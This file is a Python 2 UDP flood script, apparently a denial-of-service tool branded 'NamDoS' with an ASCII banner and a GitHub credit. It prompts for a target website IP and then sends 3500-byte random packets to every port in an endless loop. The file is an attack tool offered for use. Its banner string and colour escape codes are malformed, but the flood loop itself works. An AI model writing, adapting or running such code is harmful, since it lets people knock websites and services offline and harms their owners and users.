import socket
import os
import random
import time

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3500)

os.system("clear")
print "_   _                       _____             _____ 
 | \ | |                     |  __ \           / ____|
 |  \| |   __ _   _ __ ___   | |  | |   ___   | (___  
 | . ` |  / _` | | '_ ` _ \  | |  | |  / _ \   \___ \ 
 | |\  | | (_| | | | | | | | | |__| | | (_) |  ____) |
 |_| \_|  \__,_| |_| |_| |_| |_____/   \___/  |_____/ "                                                                     "                                                                                                                           "
print 
print("\032[32m================================================================\033[0m")
print("\032[33mGithub 	       : https://github.com/Lozllll/\033[0m")
print("\032[32m================================================================\033[0m")
print

ip = raw_input("[+] >>IP WEBSITE YOU WANT ATTACK: ")
os.system("clear")
print "ATTACKING....."
time.sleep(3)
while True:
	sent = 0
	for port in range(1, 65534):
    		white.sendto(bytes, (ip,port))
    		sent = sent + 1
    		print "\032[1;91mSend \032[1;32m%s \032[1;91m Packets to \032[1;32m%s \032[1;91mThrough port \032[1;32m%s "%(sent, ip, port)

print "\031[1;92mDONE!\031[0m"
